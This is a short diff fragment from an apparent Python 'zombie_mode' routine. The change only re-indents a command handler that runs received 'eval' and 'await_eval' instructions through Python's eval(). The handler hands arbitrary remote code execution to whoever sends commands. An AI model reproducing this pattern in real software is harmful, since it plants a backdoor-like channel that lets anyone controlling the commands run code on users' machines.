@@ -60,29 +60,29 @@ async def zombie_mode(self):
             LogLevels.INFO,
         )
 
-    if cmd.msg == "eval":
+        if cmd.msg == "eval":
 
-        instructions = []
-        if isinstance(cmd.data, str):
-            instructions.append(cmd.data)
-        elif isinstance(cmd.data, list):
-            instructions = cmd.data
+            instructions = []
+            if isinstance(cmd.data, str):
+                instructions.append(cmd.data)
+            elif isinstance(cmd.data, list):
+                instructions = cmd.data
 
-        for instruction in instructions:
-            eval(instruction)
+            for instruction in instructions:
+                eval(instruction)
 
-    elif cmd.msg == "await_eval":
+        elif cmd.msg == "await_eval":
 
-        instructions = []
-        if isinstance(cmd.data, str):
-            instructions.append(cmd.data)
-        elif isinstance(cmd.data, list):
-            instructions = cmd.data
+            instructions = []
+            if isinstance(cmd.data, str):
+                instructions.append(cmd.data)
+            elif isinstance(cmd.data, list):
+                instructions = cmd.data
 
-        for instruction in instructions:
-            await eval(instruction)
-    else:
-        self.logger.log(
-            f"Command not implemented: {cmd.msg} / {cmd.data}",
-            LogLevels.WARNING,
-        )
+            for instruction in instructions:
+                await eval(instruction)
+        else:
+            self.logger.log(
+                f"Command not implemented: {cmd.msg} / {cmd.data}",
+                LogLevels.WARNING,
+            )
